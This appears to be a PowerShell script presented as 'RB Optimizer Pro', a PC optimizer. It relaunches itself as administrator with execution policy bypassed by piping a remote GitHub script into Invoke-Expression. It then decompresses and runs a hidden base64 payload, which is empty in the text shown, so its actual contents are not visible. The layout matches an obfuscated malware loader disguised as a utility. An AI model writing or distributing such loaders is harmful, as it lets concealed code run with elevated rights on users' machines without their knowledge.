# RB Optimizer Pro v3.0 - Protected Distribution Build
$ErrorActionPreference = "Continue"
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")) {
    $cmd = "irm https://raw.githubusercontent.com/beluga1401/rboptimizer/main/RB_Optimizer.ps1 | iex"
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command $cmd" -Verb RunAs
    exit
}
$b=''
$ms=New-Object System.IO.MemoryStream(,[Convert]::FromBase64String($b))
$gz=New-Object System.IO.Compression.GZipStream($ms,[System.IO.Compression.CompressionMode]::Decompress)
$sr=New-Object System.IO.StreamReader($gz,[System.Text.Encoding]::UTF8)
$code=$sr.ReadToEnd()
$sr.Close()
$ms.Close()
&([scriptblock]::Create($code)) $args